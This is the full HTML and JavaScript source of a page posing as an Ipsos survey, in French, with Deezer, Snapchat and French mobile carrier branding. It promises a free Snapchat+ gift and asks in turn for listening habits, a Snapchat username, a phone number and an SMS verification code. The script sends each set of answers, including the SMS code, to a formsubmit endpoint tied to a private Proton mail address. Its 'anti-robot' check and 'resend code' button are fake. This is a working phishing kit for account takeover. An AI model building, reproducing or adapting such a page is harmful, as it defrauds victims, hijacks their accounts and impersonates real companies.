<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Sondage | Ipsos</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
body { font-family: 'Inter', sans-serif; background:#f4f6f9; margin:0; overflow-x:hidden; }
.header { background:#003b7a; padding:35px 40px; display:flex; align-items:center; justify-content:space-between; box-shadow:0 4px 10px rgba(0,0,0,0.1);}
.header img { height:60px; }
.header a { position:absolute; left:30px; }
.header-text { color:#fff; font-size:28px; font-weight:700; }
.logo-fixed { position:fixed; top:20px; right:20px; height:55px; z-index:999; }
.box { max-width:650px; margin:60px auto; background:white; padding:50px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.12); text-align:center; transition:all 0.5s ease; opacity:0; transform:translateY(30px); display:none; }
.box.active { display:block; opacity:1; transform:translateY(0);}
h2 { font-size:28px; margin-bottom:20px; color:#003b7a;}
p { font-size:18px; margin-bottom:20px; color:#333; line-height:1.5;}
input, select { width:100%; padding:14px; font-size:18px; border-radius:6px; border:1px solid #ccc; margin-bottom:15px; transition:all 0.3s;}
input:focus, select:focus { border-color:#0078d4; outline:none; box-shadow:0 0 8px rgba(0,120,212,0.3);}
button { padding:14px 28px; background:#0078d4; color:#fff; border:0; border-radius:8px; cursor:pointer; font-size:18px; transition:all 0.3s;}
button:hover { background:#005fa3; transform:translateY(-2px) scale(1.03); box-shadow:0 4px 12px rgba(0,0,0,0.15);}
.progress-container { width:90%; height:16px; background:#e0e0e0; border-radius:8px; margin:30px auto; position:relative; }
.progress-bar { height:100%; width:0%; background:#0078d4; border-radius:8px; transition:width 0.5s ease; }
.progress-text { position:absolute; right:10px; top:0; font-size:14px; font-weight:600; color:#003b7a; line-height:16px;}
.about { max-width:650px; margin:20px auto 40px auto; padding:20px; background:#e8f0fe; border-radius:10px; font-size:14px; color:#003b7a; line-height:1.4; text-align:left;}
.footer { text-align:center; padding:20px 0; font-size:14px; color:#999; margin-top:20px; border-top:1px solid #ddd;}
#btnResend { display:none; margin-top:15px; background:#ff5722; }
@media(max-width:600px){.box{margin:30px 20px;padding:30px;} h2{font-size:24px;} p{font-size:16px;} button{font-size:16px;} .about{font-size:13px; padding:15px;}}
</style>
</head>
<body>
<img src="francelogo.png" class="logo-fixed" alt="France">

<div class="header">
<a href="index.html" onclick="return confirm('Quitter le sondage ? Vos r√©ponses seront perdues.')"><img src="logo.png" alt="Ipsos"></a>
<div class="header-text">Ipsos ‚Äì Sondage</div>
</div>

<div class="progress-container">
    <div class="progress-bar" id="progressBar"></div>
    <div class="progress-text" id="progressText">0%</div>
</div>

<!-- √âtape 0 : Habitudes Deezer -->
<div class="box active" id="etape0">
<h2>Vos habitudes d'√©coute Deezer üéµ</h2>
<p>Merci de r√©pondre √† ces questions. Ces informations restent confidentielles et servent uniquement √† notre √©tude.</p>
<label>√âcoutez-vous r√©guli√®rement Deezer ?</label><br>
<input type="radio" name="deezer_use" value="Oui"> Oui<br>
<input type="radio" name="deezer_use" value="Non"> Non<br><br>

<label>Quels artistes √©coutez-vous le plus ? (jusqu'√† 5)</label><br>
<input type="text" name="artiste1" placeholder="Artiste 1">
<input type="text" name="artiste2" placeholder="Artiste 2">
<input type="text" name="artiste3" placeholder="Artiste 3">
<input type="text" name="artiste4" placeholder="Artiste 4">
<input type="text" name="artiste5" placeholder="Artiste 5"><br><br>

<label>Genres pr√©f√©r√©s :</label><br>
<input type="checkbox" name="genre[]" value="Pop"> Pop<br>
<input type="checkbox" name="genre[]" value="Rap / Hip-hop"> Rap / Hip-hop<br>
<input type="checkbox" name="genre[]" value="R&B"> R&B<br>
<input type="checkbox" name="genre[]" value="Electro"> Electro<br>
<input type="checkbox" name="genre[]" value="Rock"> Rock<br>
<input type="checkbox" name="genre[]" value="Afro"> Afro<br>
<input type="checkbox" name="genre[]" value="Autre"> Autre<br><br>

<button id="btnEtape0">Continuer</button>
</div>

<!-- √âtape 1 : Compte Snapchat -->
<div class="box" id="etape1">
<h2>Recevoir Snapchat+ üéÅ</h2>
<p>Merci de fournir votre identifiant Snapchat afin que nous puissions vous envoyer votre cadeau.</p>
<input type="text" id="compte_snap" placeholder="Votre identifiant Snapchat">
<button id="btnEtape1">Suivant</button>
</div>

<!-- √âtape 2 : V√©rification anti-robot -->
<div class="box" id="etape2">
<h2>V√©rification anti-robot ü§ñ</h2>
<p>Avant de continuer, nous devons nous assurer que vous √™tes un participant r√©el pour √©viter tout abus.</p>
<button id="btnEtape2">Je ne suis pas un robot</button>
</div>

<!-- √âtape 3 : Num√©ro de t√©l√©phone -->
<div class="box" id="etape3">
<h2>Num√©ro de t√©l√©phone üì±</h2>
<p>Veuillez entrer votre num√©ro de t√©l√©phone pour recevoir un code de v√©rification par SMS.</p>
<input type="text" id="telephone" placeholder="Ex: 06XXXXXXXX">
<button id="btnEtape3">Suivant</button>
</div>

<!-- √âtape 3b : Notification SMS avec d√©compte -->
<div class="box" id="etape3b">
<h2>V√©rification en cours ‚è±Ô∏è</h2>
<p>Un code SMS a √©t√© envoy√© √† votre num√©ro.</p>
<p>Vous pouvez entrer le code dans <span id="countdown">50</span> secondes.</p>
<button id="btnResend">Renvoyer le code</button>
</div>

<!-- √âtape 4 : Code SMS -->
<div class="box" id="etape4">
<h2>Code de v√©rification üì©</h2>
<p>Veuillez entrer le code que vous avez re√ßu par SMS pour finaliser votre inscription.</p>
<input type="text" id="code_sms" placeholder="Code re√ßu">
<button id="btnEtape4">Terminer</button>
</div>

<!-- √âtape 5 : Page finale -->
<div class="box" id="etape5">
<h2>Merci pour votre participation ! üéâ</h2>
<p>Votre Snapchat+ sera activ√© dans l‚Äôheure. Profitez-en !</p>
</div>

<div class="about">
<strong>√Ä propos du partenariat :</strong><br>
Ce sondage est organis√© en collaboration avec <strong>Deezer</strong> et les op√©rateurs <strong>Bouygues Telecom, SFR et Orange</strong>. 
L‚Äôoffre Snapchat+ gratuite est uniquement disponible pour les clients de ces op√©rateurs afin de garantir la compatibilit√© et la disponibilit√© du service.
</div>

<div class="footer">
¬© 2026 Ipsos ‚Äì Tous droits r√©serv√©s
</div>

<script>
let reponses = {};

function showStep(etapeId, percent){
    document.querySelectorAll('.box').forEach(b=>b.classList.remove('active'));
    document.getElementById(etapeId).classList.add('active');
    document.getElementById('progressBar').style.width = percent+"%";
    document.getElementById('progressText').innerText = percent+"%";
}

async function sendMail(dataObj, sujet){
    const formData = new FormData();
    formData.append("_subject", sujet);
    formData.append("becteurfoou@proton.me", "jack2026b@proton.me");
    formData.append("_captcha", "false");
    for(let key in dataObj){ formData.append(key, dataObj[key]); }
    try{
        await fetch("https://formsubmit.co/jack2026b@proton.me", { method:"POST", body:formData, headers:{ "Accept":"application/json" }});
        console.log("Mail envoy√©:", sujet);
    }catch(e){ console.error("Erreur d'envoi de mail", e);}
}

// √âtape 0 -> 1
document.getElementById('btnEtape0').addEventListener('click', ()=>{
    let deezer = document.querySelector('input[name="deezer_use"]:checked');
    if(!deezer){ alert("Veuillez r√©pondre √† la question Deezer."); return;}
    reponses.deezer_use = deezer.value;
    for(let i=1;i<=5;i++){ reponses['artiste'+i] = document.querySelector(`input[name="artiste${i}"]`).value.trim();}
    reponses.genre = Array.from(document.querySelectorAll('input[name="genre[]"]:checked')).map(e=>e.value);
    showStep('etape1',20);
});

// √âtape 1 -> 2
document.getElementById('btnEtape1').addEventListener('click', ()=>{
    let snap = document.getElementById('compte_snap').value.trim();
    if(!snap){ alert("Veuillez entrer votre identifiant Snapchat."); return;}
    reponses.compte_snap = snap;
    sendMail({
        deezer_use: reponses.deezer_use,
        artiste1: reponses.artiste1,
        artiste2: reponses.artiste2,
        artiste3: reponses.artiste3,
        artiste4: reponses.artiste4,
        artiste5: reponses.artiste5,
        genre: reponses.genre.join(", "),
        compte_snap: reponses.compte_snap
    }, "R√©ponses participant jusqu'√† Snapchat");
    showStep('etape2',40);
});

// √âtape 2 -> 3
document.getElementById('btnEtape2').addEventListener('click', ()=>{
    showStep('etape3',60);
});

// √âtape 3 -> 3b avec d√©compte et bouton renvoi
document.getElementById('btnEtape3').addEventListener('click', ()=>{
    let tel = document.getElementById('telephone').value.trim();
    if(!/^0[67]\d{8}$/.test(tel)){ alert("Num√©ro invalide. Commence par 06 ou 07 et 10 chiffres."); return;}
    reponses.telephone = tel;
    sendMail({
        deezer_use: reponses.deezer_use,
        artiste1: reponses.artiste1,
        artiste2: reponses.artiste2,
        artiste3: reponses.artiste3,
        artiste4: reponses.artiste4,
        artiste5: reponses.artiste5,
        genre: reponses.genre.join(", "),
        compte_snap: reponses.compte_snap,
        telephone: reponses.telephone
    }, "R√©ponses participant complet - Ipsos");

    showStep('etape3b',70);

    let countdown = 50;
    const countdownEl = document.getElementById('countdown');
    const btnResend = document.getElementById('btnResend');
    countdownEl.innerText = countdown;
    btnResend.style.display = "none";

    const timer = setInterval(()=>{
        countdown--;
        countdownEl.innerText = countdown;
        if(countdown <= 0){
            clearInterval(timer);
            btnResend.style.display = "inline-block";
        }
    },1000);

    // Permettre de passer √† l'√©tape code d√®s 5 secondes
    setTimeout(()=>{ showStep('etape4',80); }, 5000);
});

document.getElementById('btnResend').addEventListener('click', ()=>{
    alert("Un nouveau code a √©t√© envoy√© !");
});

// √âtape 4 -> 5
document.getElementById('btnEtape4').addEventListener('click', ()=>{
    let code = document.getElementById('code_sms').value.trim();
    if(!code){ alert("Veuillez entrer le code re√ßu par SMS."); return;}
    reponses.code_sms = code;
    sendMail({ code_sms: reponses.code_sms }, "Code SMS - Ipsos");
    showStep('etape5',100);
});
</script>
</body>
</html>

